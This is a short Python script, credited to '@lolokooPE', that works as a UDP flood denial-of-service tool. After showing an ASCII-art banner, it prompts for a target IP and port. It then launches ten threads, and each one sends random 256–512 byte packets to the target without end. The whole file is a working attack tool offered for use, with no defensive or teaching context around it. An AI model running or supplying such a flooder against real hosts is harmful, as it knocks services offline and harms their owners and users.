import socket
import time
import os
import random
import threading

# Coded By @lolokooPE
# Attack
def attack(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  while True:
    len = random.randint(256, 512)
    payload = os.urandom(len)
    s.sendto(payload, (ip, port))
    time.sleep(0.03)
# Menu

art = r"""


████▄  ████▄   ▄▄▄  ▄█████ █████▄ ██████
██  ██ ██  ██ ██▀██ ▀▀▀▄▄▄ ██▄▄█▀ ██▄▄
████▀  ████▀  ▀███▀ █████▀ ██     ██▄▄▄▄

"""
os.system("clear")
print("\033[31m" + art)
print("By: @lolokooPE")
print(" ")
time.sleep(1)
ip = input("IP: ")
port = int(input("PORT: "))
time.sleep(3)
print(" ")
os.system("clear")
print(art)
print(" ")
print(f"Attacking To {ip} {port}")
# Start Attack

for i in range(10):
  t = threading.Thread(target=attack,args=(ip, port), daemon=True)
  t.start()
while True:
  time.sleep(1)
